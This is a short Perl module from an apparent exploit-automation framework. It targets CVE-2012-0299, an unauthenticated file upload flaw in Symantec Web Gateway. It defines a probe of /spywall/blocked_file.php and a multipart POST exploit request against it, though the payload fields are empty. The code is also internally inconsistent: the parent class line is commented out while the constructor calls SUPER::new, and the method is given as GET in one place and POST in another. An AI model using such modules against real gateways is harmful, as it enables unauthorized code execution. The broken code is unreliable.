package MSFExploits::Exploits::SYMANTEC::MSF::SymantecWebGatewayFileUpload;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::SYMANTEC);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "SymantecWebGatewayFileUpload";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/spywall/blocked_file.php',
  PAYLOAD => '',
  TEXT => 'Checking If : /spywall/blocked_file.php Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  CVE => "CVE-2012-0299",
  DESCRIPTION => "

          This module exploits a file upload vulnerability found in Symantec Web Gateway's

        HTTP service. Due to the incorrect use of file extensions in the upload_file()

        function, attackers may to abuse the spywall/blocked_file.php file in order to

        upload a malicious PHP file without any authentication, which results in arbitrary

        code execution.

      ",
  METHOD => "GET",
  MSF_MODULE => "symantec_web_gateway_file_upload",
  OSVDB => 82025,
  REFERENCES => [
    "http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00",
  ],
  VARIABLES => {
    'URI' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'spywall/blocked_file.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [POST] /spywall/blocked_file.php',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=_Part_962_1015036656_4003666913',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
